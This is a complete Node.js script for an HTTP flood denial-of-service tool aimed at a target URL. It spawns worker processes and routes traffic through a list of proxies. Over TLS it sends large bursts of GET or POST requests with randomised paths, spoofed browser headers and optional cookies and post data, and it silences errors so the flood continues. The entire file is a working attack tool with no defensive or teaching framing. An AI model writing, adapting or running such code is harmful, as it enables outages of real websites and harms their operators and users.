process.on('uncaughtException', function (e) {
});
process.on('unhandledRejection', function (e) {
});
require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');
const randomStr = require('randomstring')
const url = require('url');

var path = require("path");
const cluster = require('cluster');

function getRandomStr() {
    const rsdat = randomStr.generate({
        "charset": "0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
        "length": 8
    });
    return rsdat;
}

let headerbuilders;

let cookies = undefined;
let postData = undefined;

var fileName = __filename;
var file = path.basename(fileName);
let randomParam = false;

if (process.argv.length < 8) {
    console.log('node ' + file + ' MODE host proxies duration rate threads (options cookie="" postdata="" randomstring="" headerdata="")');
    process.exit(0);
}

process.argv.forEach((str) => {
    if (str.includes("cookie=")) {
        cookies = str.slice(7);
    } else if (str.includes("postdata=")) {
        if (process.argv[2].toUpperCase() != "POST") {
            console.error("Method Invalid (Has Postdata But Not POST Method)")
            process.exit(1);
        }
        postData = str.slice(9);
    } else if (str.includes("randomstring=")) {
        randomParam = str.slice(13);
        console.log(" Custom RandomString");
    } else if (str.includes("headerdata=")) {
        headerbuilders = "";
        const hddata = str.slice(11).split('""')[0].split("&");
        for (let i = 0; i < hddata.length; i++) {
            const head = hddata[i].split("=")[0];
            const dat = hddata[i].split("=")[1];
            headerbuilders += `\r\n${head}: ${dat}`
        }
    }
});
if (cookies !== undefined) {
    console.log(" Custom Cookie Mode");
} else {
    cookies = ""
}
if (headerbuilders !== undefined) {
    console.log(" Custom HeaderData Mode");
}
if (postData !== undefined) {
    console.log(" Custom PostData Mode");
} else {
    postData = ""
}

if (cluster.isMaster) {
    for (let i = 0; i < process.argv[7]; i++) {
        cluster.fork();
        console.log(` rand ${i}`);
    }
    setTimeout(() => {
        process.exit(1);
    }, process.argv[5] * 1000);
} else {
    startflood();
}

var proxies = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n');
var rate = process.argv[6];
var targetUrl = process.argv[3];
const target = targetUrl.split('""')[0];
var parsed = url.parse(target);
process.setMaxListeners(0);

const cplist = [
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
];

const UAs = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edge/113.0.1774.50",
];

function startflood() {
    if (process.argv[2].toUpperCase() == "POST") {
        if (randomParam) {
            setInterval(() => {
                var cipper = cplist[Math.floor(Math.random() * cplist.length)];
                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
                var http = require('http'),
                    tls = require('tls');
                var req = http.request({
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });

                req.on('connect', function (res, socket, head) {
                    var tlsConnection = tls.connect({
                        host: parsed.host,
                        ciphers: cipper,
                        secureProtocol: 'TLSv1_2_method',
                        servername: parsed.host,
                        secure: true,
                        rejectUnauthorized: false,
                        socket: socket
                    }, function () {
                        for (let j = 0; j < rate; j++) {
                            tlsConnection.write("POST" + ' ' + `${parsed.path.replace("%RAND%", getRandomStr())}?${randomParam}=${randomStr.generate({
                                length: 12,
                                charset: "ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"
                            })}` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: ' + target + '\r\nOrigin: ' + target + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + cookies + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nContent-Type: text/plain' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%", getRandomStr()) : ""}` + '\r\n\r\n' + `${(postData !== undefined) ? postData.replace("%RAND%", getRandomStr()) : ""}` + '\r\n\r\n');
                        }
                    });
                    tlsConnection.on('error', function (data) {
                        tlsConnection.end();
                        tlsConnection.destroy();
                    });
                    tlsConnection.on('data', function (data) {
                        return;
                    });
                });
                req.end();
            });
        } else {
            setInterval(() => {
                var ciphers = cplist[Math.floor(Math.random() * cplist.length)];
                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
                var http = require('http'),
                    tls = require('tls');
                var request = http.request({
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: ciphers,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    request.end();
                    return;
                });

                request.on('connect', function (res, socket, head) {
                    var connect = tls.connect({
                        host: parsed.host,
                        ciphers: ciphers,
                        secureProtocol: 'TLSv1_2_method',
                        servername: parsed.host,
                        secure: true,
                        rejectUnauthorized: false,
                        socket: socket
                    }, function () {
                        for (let j = 0; j < rate; j++) {
                            connect.write("POST" + ' ' + parsed.path.replace("%RAND%", getRandomStr()) + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: ' + target + '\r\nOrigin: ' + target + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + cookies + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nContent-Type: text/plain' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%", getRandomStr()) : ""}` + '\r\n\r\n' + `${(postData !== undefined) ? postData.replace("%RAND%", getRandomStr()) : ""}` + '\r\n\r\n');
                        }
                    });

                    connect.on('error', function (data) {
                        connect.end();
                        connect.destroy();
                    });

                    connect.on('data', function (data) {
                        return;
                    });
                });
                request.end();
            });
        }
    } else if (process.argv[2].toUpperCase() == "GET") {
        if (randomParam) {
            setInterval(() => {
                var ciphers = cplist[Math.floor(Math.random() * cplist.length)];
                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');

                var http = require('http'),
                    tls = require('tls');

                var req = http.request({
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: ciphers,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });

                req.on('connect', function (res, socket, head) {
                    var tlsConnection = tls.connect({
                        host: parsed.host,
                        ciphers: ciphers,
                        secureProtocol: 'TLSv1_2_method',
                        servername: parsed.host,
                        secure: true,
                        rejectUnauthorized: false,
                        socket: socket
                    }, function () {
                        for (let j = 0; j < rate; j++) {
                            tlsConnection.write("GET" + ' ' + `${parsed.path.replace("%RAND%", getRandomStr())}?${randomParam}=${randomStr.generate({
                                length: 12,
                                charset: "ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"
                            })}` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: ' + target + '\r\nOrigin: ' + target + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + cookies + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%", getRandomStr()) : ""}` + '\r\n\r\n');
                        }
                    });

                    tlsConnection.on('error', function (data) {
                        tlsConnection.end();
                        tlsConnection.destroy();
                    });
                });
                req.end();
            });
        } else {
            setInterval(() => {
                var ciphers = cplist[Math.floor(Math.random() * cplist.length)];
                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
                var http = require('http'),
                    tls = require('tls');

                var req = http.request({
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: ciphers,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });

                req.on('connect', function (res, socket, head) {
                    var connect = tls.connect({
                        host: parsed.host,
                        ciphers: ciphers,
                        secureProtocol: 'TLSv1_2_method',
                        servername: parsed.host,
                        secure: true,
                        rejectUnauthorized: false,
                        socket: socket
                    }, function () {
                        for (let j = 0; j < rate; j++) {
                            connect.write("GET" + ' ' + `${parsed.path.replace("%RAND%", getRandomStr())}` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: ' + target + '\r\nOrigin: ' + target + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + cookies + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%", getRandomStr()) : ""}` + '\r\n\r\n');
                        }
                    });

                    connect.on('error', function (data) {
                        connect.end();
                        connect.destroy();
                    });
                    connect.on('data', function (data) {
                    });
                });
                req.end();
            });
        }
    }
}
